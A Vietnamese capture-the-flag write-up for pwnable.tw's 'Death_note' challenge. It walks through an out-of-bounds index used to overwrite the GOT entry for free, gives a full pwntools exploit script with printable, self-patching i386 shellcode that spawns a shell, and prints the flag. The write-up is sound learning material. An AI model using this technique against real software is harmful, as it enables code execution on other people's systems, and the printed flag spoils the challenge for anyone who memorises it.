# Death_note (Pwnable.tw)

**1 chall cần kết hợp nhiều kĩ thuật đã học**

# ida

```c 
int menu()
{
  puts("-----------------------------------");
  puts("             DeathNote             ");
  puts("-----------------------------------");
  puts(" 1. Add a name                     ");
  puts(" 2. show a name on the note        ");
  puts(" 3. delete a name int the note     ");
  puts(" 4. Exit                           ");
  puts("-----------------------------------");
  return printf("Your choice :");
}

unsigned int add_note()
{
  int v1; // [esp+8h] [ebp-60h]
  char s[80]; // [esp+Ch] [ebp-5Ch] BYREF
  unsigned int v3; // [esp+5Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  v1 = read_int();
  if ( v1 > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  printf("Name :");
  read_input((unsigned __int8 *)s, 0x50u);
  if ( !is_printable(s) )
  {
    puts("It must be a printable name !");
    exit(-1);
  }
  *(&note + v1) = strdup(s);
  puts("Done !");
  return __readgsdword(0x14u) ^ v3;
}

int show_note()
{
  int result; // eax
  int v1; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  v1 = read_int();
  if ( v1 > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  result = (int)*(&note + v1);
  if ( result )
    return printf("Name : %s\n", (const char *)*(&note + v1));
  return result;
}

int del_note()
{
  int result; // eax
  int v1; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  v1 = read_int();
  if ( v1 > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
  free(*(&note + v1));
  result = v1;
  *(&note + v1) = 0;
  return result;
}



int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = read_int();
      if ( v3 != 2 )
        break;
      show_note();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        del_note();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      add_note();
    }
  }
}
```

ở đây chương trình cho mình 3 option, **cả 3 option đều có lỗi oob**

**checks**

![image](https://github.com/gookoosss/CTF/assets/128712571/8aed54aa-dec3-4d71-96a8-f9f215fb5317)


ở đây ta có sẵn **PIE tắt nên ko cần leak địa chỉ exe**

giờ ta sẽ cùng vào phân tích ida

## Phân tích

- **Option 1**


ở option 1 có 1 đoạn code khá là đặt biệt:

```c 
if ( !is_printable(s) )
  {
    puts("It must be a printable name !");
    exit(-1);
  }
  *(&note + v1) = strdup(s);
  puts("Done !");
  return __readgsdword(0x14u) ^ v3;
```

ở đây dữ liệu nhập vào sẽ được check qua hàm **is_printable()** , ta xem hàm này ntn

![image](https://github.com/gookoosss/CTF/assets/128712571/f6343647-647e-4220-9d35-17591e1717df)


**ồ vậy là ở đây ta phải nhập những byte in được từ byte 0x2 đến 0x7f, nếu không chương trình sẽ dừng ngay lập tức**

```c
*(&note + v1) = strdup(s);
````

dòng code này sẽ **khởi tạo địa chỉ heap để lưu giá trị ta nhập vào** 

để ý biến note thì đây là 1 biến public, dựa vào biến này và index sẽ tính ra địa chỉ ta nhập dữ liệu vào

![image](https://github.com/gookoosss/CTF/assets/128712571/3825fce3-5e84-40a1-a7e2-049ac03f4866)



- **Option 2**

tại đây ta cho phép ta leak được địa chỉ cần thiết, nhưng PIE đã tắt nên mình cũng không cần gì nhiều nên tạm thời bỏ qua option này

- **Option 3**

**tại đậy thì chương trinh sẽ giải phóng dữ liệu ta nhập vào heap tại option 1 bằng hàm free()**, ở đây mình nhận ra ý tưởng để khai thác là nhập shellcode vào got&free tại option 1 rồi chọn option 3 chạy shellcode

## Khai thác

- **Stage 1:** tìm index

trước tiên thì ta cần **tìm index chạy đến got&free**

debug thì ta sẽ biết là địa chỉ ta trỏ đến sẽ bằng: 

```
address = (index * 4) + note(0x804a060)
```

![image](https://github.com/gookoosss/CTF/assets/128712571/f36c3808-165c-466f-ad14-43bd418c6cbe)


vậy ta cần giờ **ta cần index thì ta chỉ cần lấy (got&free - note ) / 4 là xong**

```python 
note = 0x0804a060
free = exe.got['free']
index = (free - note) / 4
log.info('note: ' + hex(note))
log.info('free: ' + hex(free))
log.info('index: ' + str(index)) # index = -19
```

- **Stage 2:** viết shellcode 

sau khi có được index rồi thì ta cần có shellcode để nhập vào, **vấn đề ở đây là shellcode phải thỏa điều kiện của hàm is_printable là các byte nhằm từ 0x2 đến 0x7f, cái này rất khó**

những thứ ta cần
```
eax = 0xb
edx = 0x0
ecx = 0x0
ebx = /bin//sh
int 0x80
```

vấn đề ở đây là để setup những arg này **ta không thể dùng lệnh mov và int 0x80 được**

**sau khi mình tham khảo writeup của @hlaan** thì đây shellcode cho chall này

```python3
shellcode = asm(
    '''
    push eax # gán địa chỉ heap đang lưu shellcode vào stack để lưa vào ebp
    pop ebp 
    
    ########################
    ### Stage 1: set ebx ###
    ########################
    
    push edx # debug thì thấy edx là null byte sẵn rồi nên ta đặt vào stack luôn
    push 0x68732f2f # //sh
    push 0x6e69622f # /bin
    push esp # khởi tạo cho esp bằng stack đang chứ /bin//sh\0
    pop ebx # gán /bin//sh\0 vào ebx 
    
    #####################################
    ### Stage 2: set edi = 0xffffcd80 ###
    #####################################
    
    # note: int 0x80 = \xCD\x80
    
    push 0x30     #
    pop eax       # set eax = 0x0
    xor al, 0x30  #
    dec eax # trừ 1 để eax = 0xfffffff
    xor ax, 0x5555 # lúc này eax = 0xffffaaaa
    xor ax, 0x2a67 # lúc này eax =  0xffffcd80
    push eax 
    pop edi # edi = 0xffffcd80
    
    ##############################
    ### Stage 3: set ecx = 0x0 ###
    ##############################
    
    push 0x30
    pop eax
    xor al, 0x30

    push eax
    pop ecx
    
    ##############################
    ### Stage 4: set eax = 0xb ###
    ##############################
    
    # note : 0xb = 11
    
    # cộng 1 cho eax 11 lần
    
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax  # eax = 0xb
    
    ##############################
    ### Stage 4:set int = 0x80 ###
    ##############################
    
    # note : 0x35 = 53
    # nguyên cái shellcode của ta là 53 byte rồi , ebp + x35 là địa chỉ của byte thứ 54 đang là null byte ta sẽ setup bằng 2 byte cuối của rdi lúc này là 0xcd80, vậy là ta đã có int 0x80 mà không cần nhập vào
    # mình có note thêm bằng ảnh dưới các bạn tham khảo thêm
    
    xor [ebp + 0x35], di

    ''', arch='i386')

```

giải thích thêm stage 5 trên shellcode:

- trước đó:

![image](https://github.com/gookoosss/CTF/assets/128712571/f8f6547e-4d86-46d1-8608-974550908114)


- sau đó:

![image](https://github.com/gookoosss/CTF/assets/128712571/eca8525d-54a3-4542-aa7e-bd0a68b8e8f4)


**cuối cùng ta lấy shell và có flag thôi**

## script 

```python 

#!/usr/bin/env python3

from pwn import *

exe = ELF("./death_note")
# libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")
# ld = ELF("./ld-2.35.so")
# p = remote("chall.pwnable.tw", 10201)
context.binary = exe

p = process([exe.path])
 
gdb.attach(p, gdbscript = '''
b*add_note+33
b*add_note+132
b*del_note+76
c           
''')
           
input()

shellcode = asm(
    '''
    push eax
    pop ebp
    
    push edx
    push 0x68732f2f
    push 0x6e69622f
    push esp
    pop ebx

    push 0x30
    pop eax
    xor al, 0x30
    dec eax
    xor ax, 0x5555
    xor ax, 0x2a67
    push eax 
    pop edi

    push 0x30
    pop eax
    xor al, 0x30

    push eax
    pop ecx

    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 
    inc eax 

    xor [ebp + 0x35], di

    ''', arch='i386')

note = 0x0804a060
free = exe.got['free']
index = (free - note) / 4
log.info('note: ' + hex(note))
log.info('free: ' + hex(free))
log.info('index: ' + str(index))

p.sendafter(b'choice :' , b'1')
p.sendafter(b'Index :' , str(index))
p.sendafter(b'Name :' , shellcode)

p.sendafter(b'choice :' , b'3')
p.sendafter(b'Index :' , str(index))


p.interactive()

# FLAG{sh3llc0d3_is_s0_b34ut1ful}

```

## Flag

FLAG{sh3llc0d3_is_s0_b34ut1ful}





